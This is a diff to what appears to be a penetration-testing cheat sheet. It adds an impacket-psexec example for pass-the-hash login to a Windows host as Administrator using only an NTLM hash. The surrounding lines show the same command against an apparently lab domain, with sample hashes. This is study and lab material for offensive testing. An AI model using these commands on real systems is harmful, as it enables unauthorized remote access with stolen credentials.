@@ -32,4 +32,7 @@ psexec.py $domain/$user:$password@$ip
 impacket-psexec $domain/$user@$ip -hashes $LM-authentication:$NTLM
 # Example:
 # impacket-psexec egotistical-bank.local/administrator@$ip -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
+
+# If we only have the NTLM, then we can leave the $LM part in blank. Example:
+impacket-psexec Administrator@$ip -hashes :30B3783CE2ABF1AF70F77D0660CF3453
 ```
